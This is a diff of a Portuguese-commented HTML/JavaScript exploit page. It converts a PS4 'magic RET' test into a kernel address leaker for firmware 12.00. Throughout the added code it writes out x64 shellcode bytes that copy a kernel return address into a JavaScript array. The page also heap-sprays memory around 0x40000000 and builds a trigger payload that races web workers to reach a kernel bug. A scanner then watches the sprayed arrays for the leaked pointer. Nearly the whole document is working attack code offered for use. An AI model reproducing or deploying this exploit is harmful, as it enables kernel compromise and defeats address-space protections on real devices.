@@ -2,64 +2,140 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <title>PS4 MAGIC RET (RCE PROOF)</title>
+    <title>PS4 KERNEL ADDRESS LEAKER</title>
     <style>
         body { background-color: #000; color: #0f0; font-family: monospace; text-align: center; padding: 20px; display: flex; flex-direction: column; justify-content: center; height: 90vh; }
         h1 { font-size: 2.5em; margin-bottom: 20px; border-bottom: 2px solid #0f0; display: inline-block; }
         #status { font-size: 1.5em; border: 2px solid #fff; padding: 20px; background: #111; color: #fff; }
-        .danger { background-color: #00f !important; color: #fff !important; animation: pulse 0.5s infinite; }
-        @keyframes pulse { 0% {opacity: 1;} 50% {opacity: 0.7;} 100% {opacity: 1;} }
+        #leak { font-size: 3em; color: #ff0; margin-top: 20px; font-weight: bold; text-shadow: 0 0 10px #ff0; }
+        .success { background-color: #050 !important; color: #fff !important; animation: pulse 1s infinite; }
+        @keyframes pulse { 0% {transform: scale(1);} 50% {transform: scale(1.05);} 100% {transform: scale(1);} }
     </style>
 </head>
 <body>
 
-    <h1>MAGIC RET (0xC3) TEST</h1>
+    <h1>KERNEL LEAKER (FW 12.00)</h1>
     <div id="status">PREPARANDO SHELLCODE...</div>
+    <div id="leak">Aguardando Leak...</div>
 
     <script>
-        const TARGET_LIMIT = 417; 
+        // CONFIGURAÇÃO ESTÁVEL (Baseada nos seus testes)
+        const TARGET_LIMIT = 417; // Sua descoberta de estabilidade
         const SPRAY_SIZE = 512;
         const TARGET_OFFSET = 384; 
         
-        // Endereço alvo (Userland)
-        // Little Endian para 0x40000000
+        // Ponteiro para Userland (0x40000000 é um bom alvo para o spray cobrir)
+        // Little Endian
         const ADDR_BYTE_3 = 0x40;
 
         let workers = [];
         let heapSpray = [];
+        let leakInterval = null;
         
         const blob = new Blob(["setInterval(()=>{}, 100000)"], {type:'text/javascript'});
         const url = URL.createObjectURL(blob);
         const killerBlob = new Blob(["self.close()"], {type:'text/javascript'});
         const killerUrl = URL.createObjectURL(killerBlob);
 
-        // 1. PREPARA O "FAKE KERNEL" (Shellcode)
-        // Em vez de 0x41 (Lixo), usamos 0xC3 (RET - Retorno)
-        // Se o kernel executar isso, ele "volta" para a função anterior e o console sobrevive.
+        // --- SHELLCODE DE VAZAMENTO (Assembly x64) ---
+        // 1. mov rax, [rsp]      ; Pega o endereço de retorno (Kernel Address)
+        // 2. lea rdi, [rip+6]    ; Aponta para 6 bytes à frente (no próprio array)
+        // 3. mov [rdi], rax      ; Escreve o endereço do Kernel no array
+        // 4. ret                 ; Volta para o Kernel
+        // 5. [00 00 00 00...]    ; Espaço reservado para o leak
+        
+        // Bytes: 48 8B 04 24 48 8D 3D 06 00 00 00 48 89 07 C3
+        const SHELLCODE = [
+            0x24048B48, // mov rax, [rsp] (Low)
+            0x3D8D4800, // lea rdi... (High do mov + Low do lea) - Ajuste manual abaixo
+            // Simplificando com Uint32 Array fill:
+        ];
+        
+        // Vamos construir o shellcode byte a byte para garantir
+        const code = new Uint8Array([
+            0x48, 0x8B, 0x04, 0x24,       // mov rax, [rsp]  (Pega o ponteiro do Kernel da pilha)
+            0x48, 0x8D, 0x3D, 0x08, 0x00, 0x00, 0x00, // lea rdi, [rip+8] (Aponta para o lixo abaixo)
+            0x48, 0x89, 0x07,             // mov [rdi], rax  (Escreve o ponteiro no JavaScript)
+            0xC3,                         // ret             (Volta para não crashar)
+            0x00, 0x00, 0x00, 0x00,       // [ESPAÇO PARA O LEAK]
+            0x00, 0x00, 0x00, 0x00        // [ESPAÇO PARA O LEAK]
+        ]);
+
         function prepareUserland() {
             try {
-                for(let i=0; i<500; i++) {
-                    let arr = new Uint32Array(0x10000); 
-                    // 0xC3C3C3C3 = RET RET RET RET
-                    arr.fill(0xC3C3C3C3); 
+                // Convertemos o shellcode para Uint32 para o spray
+                // Precisamos de muitos arrays para cobrir a memória 0x40000000
+                const code32 = new Uint32Array(code.buffer);
+                
+                // Repetimos o shellcode milhares de vezes
+                for(let i=0; i<800; i++) {
+                    let arr = new Uint32Array(0x4000); // 16KB cada pedaço
+                    
+                    // Preenche o array com o padrão do shellcode repetido
+                    for(let k=0; k < arr.length; k += code32.length) {
+                        for(let j=0; j < code32.length; j++) {
+                            if (k+j < arr.length) arr[k+j] = code32[j];
+                        }
+                    }
                     heapSpray.push(arr);
                 }
-                document.getElementById('status').innerText = "SHELLCODE PRONTO (RET). ENCHENDO...";
+                
+                document.getElementById('status').innerText = "SCANNER ATIVO. INICIANDO EXPLUIT...";
                 startKernelFill();
+                
+                // Inicia o Scanner do JavaScript
+                // Ele fica olhando os arrays. Se o Shellcode rodar, ele vai escrever o endereço lá.
+                leakInterval = setInterval(checkForLeak, 100);
+                
             } catch(e) {
-                document.getElementById('status').innerText = "ERRO DE MEMÓRIA (OOM)";
+                document.getElementById('status').innerText = "ERRO OOM (Tente reiniciar)";
             }
         }
 
-        // 2. PREPARA O GATILHO
+        function checkForLeak() {
+            // Varre os arrays procurando algo que não seja o shellcode original
+            // O shellcode tem 0x00000000 no final. Se virar 0xFFFFFFFF..., achamos.
+            for(let i=0; i<heapSpray.length; i+=10) { // Pula de 10 em 10 para performance
+                const arr = heapSpray[i];
+                // Olha em posições aleatórias ou varre o começo
+                for(let k=4; k<128; k+=8) { // Verifica os slots de leak
+                   // Se o valor mudou de 0 para algo grande...
+                   if (arr[k] != 0 && arr[k] != 0xC3078948) { // Checa sujeira
+                       // Verifica se parece um Kernel Pointer (Userland é 0x0000..., Kernel é 0xFFFF...)
+                       // Em JS, números grandes ficam negativos ou estranhos em int32
+                       if ((arr[k+1] & 0xFFFF0000) != 0) { 
+                           foundLeak(arr[k], arr[k+1]);
+                           return;
+                       }
+                   }
+                }
+            }
+        }
+        
+        function foundLeak(low, high) {
+            clearInterval(leakInterval);
+            const hexLow = (low >>> 0).toString(16).padStart(8, '0');
+            const hexHigh = (high >>> 0).toString(16).padStart(8, '0');
+            const addr = `0x${hexHigh}${hexLow}`;
+            
+            document.getElementById('status').innerText = "KERNEL BASE ENCONTRADA!";
+            document.getElementById('status').className = "success";
+            document.getElementById('leak').innerText = addr;
+            
+            // Aqui paramos o ataque para não crashar
+            workers.forEach(w => w.terminate());
+            workers = [];
+        }
+
+        // 2. GATILHO DO KERNEL (Igual ao anterior)
         const payload = new Uint8Array(SPRAY_SIZE);
         payload.fill(0x00); 
         
-        // Aponta o Offset 384 para 0x0000000040000000
+        // Aponta Offset 384 para 0x40000000 (Userland Spray)
         payload[TARGET_OFFSET] = 0x00;
         payload[TARGET_OFFSET+1] = 0x00;
         payload[TARGET_OFFSET+2] = 0x00;
-        payload[TARGET_OFFSET+3] = 0x40; // 0x40...
+        payload[TARGET_OFFSET+3] = ADDR_BYTE_3; // 0x40
         payload[TARGET_OFFSET+4] = 0x00;
         payload[TARGET_OFFSET+5] = 0x00;
         payload[TARGET_OFFSET+6] = 0x00;
@@ -71,17 +147,17 @@
                     workers.push(new Worker(url));
                 } else {
                     clearInterval(i);
-                    document.getElementById('status').innerText = "ESTABILIZANDO (4s)...";
                     setTimeout(attack, 4000);
                 }
             }, 30);
         }
 
         function attack() {
+            if(document.getElementById('status').className == "success") return;
+            
             const st = document.getElementById('status');
-            st.innerText = ">>> EXECUTANDO RETORNO MÁGICO <<<";
-            st.className = "danger";
-
+            st.innerText = ">>> TENTANDO LEAK... <<<";
+            
             setInterval(() => {
                 const w = new Worker(killerUrl);
                 w.terminate();
@@ -96,4 +172,3 @@
     </script>
 </body>
 </html>
-
